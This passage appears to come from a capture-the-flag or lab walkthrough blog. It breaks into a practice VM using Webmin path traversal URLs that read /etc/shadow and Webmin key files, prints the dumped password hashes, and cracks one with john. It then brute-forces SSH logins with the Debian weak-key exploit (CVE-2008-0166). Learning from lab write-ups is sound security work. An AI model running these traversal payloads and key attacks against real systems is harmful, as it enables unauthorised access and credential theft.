<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
</span><span class='line'>daemon:&lt;em>:14040:0:99999:7:::
</span><span class='line'>bin:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>sys:&lt;em>:14040:0:99999:7:::
</span><span class='line'>sync:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>games:&lt;em>:14040:0:99999:7:::
</span><span class='line'>man:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>lp:&lt;em>:14040:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>&lt;a href="news:*:14040:0:99999:7:::">news:*:14040:0:99999:7:::&lt;/a>
</span><span class='line'>uucp:&lt;em>:14040:0:99999:7:::
</span><span class='line'>proxy:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>www-data:&lt;em>:14040:0:99999:7:::
</span><span class='line'>backup:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>list:&lt;em>:14040:0:99999:7:::
</span><span class='line'>irc:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>gnats:&lt;em>:14040:0:99999:7:::
</span><span class='line'>nobody:&lt;/em>:14040:0:99999:7:::
</span><span class='line'>dhcp:!:14040:0:99999:7:::
</span><span class='line'>syslog:!:14040:0:99999:7:::
</span><span class='line'>klog:!:14040:0:99999:7:::
</span><span class='line'>mysql:!:14040:0:99999:7:::
</span><span class='line'>sshd:!:14040:0:99999:7:::
</span><span class='line'>vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
</span><span class='line'>obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
</span><span class='line'>osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
</span><span class='line'>yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>

<p>Using john on /etc/shadow, we obtain credentials of user vmware for successful login to the system:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>h4ckm3           (vmware)</span></code></pre></td></tr></table></div></figure></p>

<p>The box could be rooted using standard vmsplice exploit.</p>

<p>However, there is another way to get user account. The script
<a href="https://wiki.debian.org/SSLkeys#Testing_keys_using_dowkd.pl">dowkd.pl</a> ensures
us that the OpenSSL is vulnerable
(<a href="https://security-tracker.debian.org/tracker/CVE-2008-0166">CVE-2008-0166</a>).</p>

<p>We download and unpack already generated RSA keys from offensive-security repository:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget &lt;a href="https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2">https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>Because usage of weak private keys could be blacklisted on our server, we use
the following
<a href="https://unix.stackexchange.com/questions/109908/public-key-f36e8704ea2db360ff42ad26671794d5-blacklisted-see-ssh">instructions</a>
to enable them.</p>

<p>Basically adding this directive to our ssh_config file should be sufficient:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>UseBlacklistedKeys yes</span></code></pre></td></tr></table></div></figure></p>

<p>In exploitdb, we use python script to try every possible private key:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python platforms/linux/remote/5720.py /tmp/rsa/2048 192.168.0.25 obama&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
</span><span class='line'>Execute: ssh -lobama -p22 -i /tmp/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.0.25</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
